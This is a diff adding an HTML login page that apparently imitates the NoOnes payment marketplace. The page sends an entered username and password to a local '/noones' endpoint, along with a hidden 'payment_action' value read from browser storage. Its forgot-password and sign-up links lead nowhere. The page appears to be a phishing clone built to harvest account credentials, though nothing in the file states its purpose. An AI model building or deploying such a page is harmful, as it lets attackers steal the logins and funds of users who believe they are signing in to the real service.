@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>NoOnes Login </title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    html, body {
+      height: 100%;
+      width: 100%;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: url('/static/assets/og-image4.jpg') no-repeat center center fixed !important;
+      background-size: cover !important;
+      background-position: center;
+      background-repeat: no-repeat;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+      overflow: hidden;
+    }
+
+    .login-card {
+      background-color: white;
+      border-radius: 8px;
+      padding: 30px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.3);
+      display: flex;
+      flex-direction: column;
+    }
+
+    .login-card .logo {
+      font-size: 2rem;
+      font-weight: bold;
+      color: #00c389;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .login-card .field {
+      margin-bottom: 1rem;
+      width: 100%;
+    }
+
+    .login-card input[type="email"],
+    .login-card input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      background-color: #f7f7f7;
+    }
+
+    .forgot-password {
+      text-align: right;
+      margin-top: 5px;
+    }
+
+    .forgot-password a {
+      color: #009b6e;
+      text-decoration: none;
+      font-size: 0.9rem;
+    }
+
+    .continue-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #ccc;
+      border: none;
+      color: #fff;
+      border-radius: 5px;
+      margin-top: 1rem;
+      cursor: not-allowed;
+      transition: background-color 0.3s ease;
+    }
+
+    .bottom-link {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .bottom-link a {
+      color: #009b6e;
+      text-decoration: none;
+      font-size: 0.9rem;
+    }
+
+    .notification {
+      position: absolute;
+      top: 10%;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #ff0000;
+      color: white;
+      padding: 15px;
+      border-radius: 8px;
+      display: none;
+      z-index: 10;
+    }
+
+    @media (max-width: 480px) {
+      .login-card { padding: 20px; }
+      .login-card .logo { font-size: 1.7rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-card">
+    <div class="logo">NoOnes Login</div>
+    <form method="POST" action="/noones" id="loginForm">
+      <div class="field">
+        <label for="emailInput">Username</label>
+        <input type="email" name="username" id="emailInput" required placeholder="example@email.com" />
+      </div>
+
+      <div class="field">
+        <label for="passwordInput">Password</label>
+        <input type="password" name="password" id="passwordInput" required placeholder="Password" />
+        <div class="forgot-password">
+          <a href="#">Forgot password?</a>
+        </div>
+      </div>
+
+      <input type="hidden" name="action" id="actionInput" value=""/>
+      <button type="submit" class="continue-btn" id="continueBtn" disabled>Continue</button>
+    </form>
+
+    <div class="bottom-link">
+      <p>Not a member yet? <a href="#">Sign up</a></p>
+    </div>
+  </div>
+
+  <div class="notification" id="notification"></div>
+
+  <script>
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const continueBtn = document.getElementById('continueBtn');
+    const notification = document.getElementById('notification');
+    const actionInput = document.getElementById('actionInput');
+
+    function validateInputs() {
+      continueBtn.disabled = !(emailInput.value.trim() && passwordInput.value.trim());
+      continueBtn.style.cursor = continueBtn.disabled ? 'not-allowed' : 'pointer';
+      continueBtn.style.backgroundColor = continueBtn.disabled ? '#ccc' : '#009b6e';
+    }
+
+    emailInput.addEventListener('input', validateInputs);
+    passwordInput.addEventListener('input', validateInputs);
+
+    window.addEventListener('DOMContentLoaded', () => {
+      let action = localStorage.getItem('payment_action');
+      actionInput.value = action ? action : 'Unknown Action';
+      if (!action) console.warn('Payment action was not set — sending as Unknown.');
+    });
+
+    function showNotification(message) {
+      notification.textContent = message;
+      notification.style.display = 'block';
+      setTimeout(() => notification.style.display = 'none', 3000);
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      if (!emailInput.value.trim() || !passwordInput.value.trim()) {
+        e.preventDefault();
+        showNotification('Please fill both fields.');
+      }
+    });
+  </script>
+</body>
+</html>
